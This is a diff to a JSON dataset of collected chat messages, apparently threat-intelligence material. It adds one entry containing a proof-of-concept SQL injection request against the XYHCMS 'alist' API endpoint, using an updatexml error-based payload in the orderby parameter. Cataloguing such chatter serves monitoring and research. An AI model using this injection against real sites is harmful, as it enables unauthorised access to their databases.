@@ -9419,6 +9419,16 @@
                 "N/A"
             ],
             "URLs": []
+        },
+        {
+            "Message ID": 2088,
+            "Date": "2024-09-29",
+            "Content": "xyhcms alist sql\n\nGET /index.php/Api/Lt/alist?orderby[updatexml(1,concat(0x3a,(select%20md5(123)),0x3a),1);]=1 HTTP/1.1\n\nmd5(123)\n\n#exploit #poc #SQL",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
         }
     ],
     "Anonymous Chat": [
